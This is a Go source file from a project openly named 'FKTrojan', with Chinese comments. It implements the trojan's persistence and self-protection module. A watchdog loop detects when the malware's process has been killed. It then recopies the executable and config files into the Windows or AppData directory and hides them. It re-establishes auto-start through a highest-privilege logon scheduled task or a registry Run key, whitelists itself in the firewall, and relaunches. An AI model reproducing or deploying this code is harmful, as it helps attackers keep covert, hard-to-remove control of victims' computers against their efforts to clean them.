/*
Author: FreeKnight
主动防御
*/
//------------------------------------------------------------
package components

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"fmt"
	"os"
	"os/exec"
	"syscall"

	"golang.org/x/sys/windows/registry"
	"path/filepath"
)

//------------------------------------------------------------
// 看门狗开启守护
func watchDog() {
	// 死循环
	for {
		// 防止CPU占满
		takeAShortRest()
		// 检查自身是否在系统进程列表中
		val, _ := checkIsProcessInWin32ProcessList(myExeName)
		if val {
			continue // 在的话，啥都不管了，继续休息
		}

		// 他XX的，看来被杀了
		if isAdmin { // 哥哥是管理员

			//if !checkIsFileExist(winDirPath + myExeName + ".exe") { // 连执行文件都被杀掉了...
				// 从备份源进行拷贝
				_ = copyFileToDirectory(os.Args[0], winDirPath+myExeName+".exe")
				dir, _ := filepath.Split(os.Args[0])
				// 拷贝附属文件
				copyFileToDirectory(dir+configFile, winDirPath+configFile)
				copyFileToDirectory(dir+anvirConfigFile, winDirPath+anvirConfigFile)
				copyFileToDirectory(dir+anvirExeFile, winDirPath+anvirExeFile)
				// 保命要紧，隐藏备份源
				hideFile(winDirPath + myExeName + ".exe")
				hideFile(winDirPath+anvirExeFile)
				hideFile(winDirPath+anvirConfigFile)
				hideFile(winDirPath+configFile)
				// 要求启动计划任务，在每次启动时打开本进程
				schTaskCmd := fmt.Sprintf(`SCHTASKS /CREATE /SC ONLOGON /RL HIGHEST /TR %s /TN %s /F`, winDirPath+myExeName+".exe", "HKLM\\"+registryAutoRunPath+"\\"+myExeName)
				CommandWork := exec.Command("cmd", "/C", schTaskCmd)
				CommandWork.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				_, _ = CommandWork.Output()
				// 添加防火墙信任
				if autofirwall {
					addFileToFirewall(myExeName, os.Args[0])
				}
			//}
		} else { // 妈的，连管理员都不给

			//if !checkIsFileExist(tmpAppDataInstallDir + myExeName + ".exe") { // 连执行文件都被杀掉了...
				// 从备份源进行拷贝
				_ = copyFileToDirectory(os.Args[0], tmpAppDataInstallDir+myExeName+".exe")
				dir, _ := filepath.Split(os.Args[0])
				// 拷贝附属文件
				copyFileToDirectory(dir+configFile, tmpAppDataInstallDir+configFile)
				copyFileToDirectory(dir+anvirConfigFile, tmpAppDataInstallDir+anvirConfigFile)
				copyFileToDirectory(dir+anvirExeFile, tmpAppDataInstallDir+anvirExeFile)
				// 保命要紧，隐藏备份源
				hideFile(tmpAppDataInstallDir + myExeName + ".exe")
				hideFile(tmpAppDataInstallDir+anvirExeFile)
				hideFile(tmpAppDataInstallDir+anvirConfigFile)
				hideFile(tmpAppDataInstallDir+configFile)
				// 让注册表里进行自启动吧
				_ = writeRegistryKey(registry.CURRENT_USER, registryAutoRunPath, myExeName, tmpAppDataInstallDir+myExeName+".exe")
			//}
		}

		// 当场再启动
		ine, _ := checkIsProcessInWin32ProcessList(myExeName)
		if !ine {
			runThirdExe("start " + winDirPath + myExeName + ".exe")
		}
	}
}

//------------------------------------------------------------
// 新线程进行主动防御
func runActiveDefense() {
	for activeDefense {
		// 好好休息，不着急
		takeALonglongRest()

		// 和 install() 函数一样，添加了一些检查，频繁的自我检查而已
		if !checkIsFileExist(winDirPath + myExeName + ".exe") {
			cmd := exec.Command("cmd", "/Q", "/C", "move", "/Y", os.Args[0], winDirPath+myExeName+".exe")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			_, _ = cmd.Output()
		}

		if isAdmin {
			cmd := fmt.Sprintf(`SCHTASKS /CREATE /SC ONLOGON /RL HIGHEST /TR %s /TN %s /F`, winDirPath+myExeName+".exe", "HKLM\\"+registryAutoRunPath+"\\"+myExeName)
			CommandWork := exec.Command("cmd", "/C", cmd)
			CommandWork.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			_, _ = CommandWork.Output()

			if autofirwall {
				addFileToFirewall(myExeName, os.Args[0])
			}
		} else {
			_ = writeRegistryKey(registry.CURRENT_USER, registryAutoRunPath, myExeName, tmpAppDataInstallDir+myExeName+".exe")
		}
		// 隐藏安装文件
		hideFile(winDirPath + myExeName + ".exe")

		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "ID", common.Obfuscate(myUID))
		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "INSTALL", curTime)
		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "NAME", common.Obfuscate(myExeName))
		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "VERSION", clientVersion)

		// 看门狗注册表自启动
		_ = writeRegistryKey(registry.CURRENT_USER, registryAutoRunPath, watchdogName, tmpAppDataInstallDir+watchdogName+".exe")

		// 拷贝看门狗文件
		if !checkIsFileExist(tmpAppDataInstallDir + watchdogName + ".exe") {
			_ = copyFileToDirectory(os.Args[0], tmpAppDataInstallDir+watchdogName+".exe")
		}

		// 隐藏看门狗文件
		hideFile(tmpAppDataInstallDir + watchdogName + ".exe")

		// 启动看门狗
		ine, _ := checkIsProcessInWin32ProcessList(watchdogName)
		if !ine {
			runThirdExe("start " + tmpAppDataInstallDir + watchdogName + ".exe")
			//messageBox(startUpErrorTitle, startUpErrorText, MB_ICONERROR)
			os.Exit(1)
		}
	}
}

//------------------------------------------------------------
